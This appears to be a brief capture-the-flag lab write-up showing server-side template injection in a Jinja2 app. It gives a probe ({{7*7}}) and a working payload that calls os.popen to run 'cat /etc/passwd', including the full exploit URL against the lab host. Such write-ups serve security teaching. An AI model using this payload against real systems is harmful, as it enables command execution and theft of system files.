
The application reflects user-controlled input inside the page:

```html id="f9k2wr"
Welcome to http://TARGET/PAYLOAD!
```

Testing SSTI with:

```txt id="x6v3nm"
{{7*7}}
```

returned:

```txt id="w4m8qc"
49
```

which confirms Server-Side Template Injection (SSTI).

The backend is vulnerable to Jinja2 template injection.

To achieve file read and retrieve `/etc/passwd`, the following payload was used:

```txt id="g5t1pz"
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

Final exploit:

```txt id="u2q7fd"
http://cdcamxwl32pue3e6mp6v4wpeuxzg10wz0wkr5cwzo-web.cybertalentslabs.com/{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

The payload executes the `cat /etc/passwd` command through Python’s `os.popen()` and displays the file contents in the response.

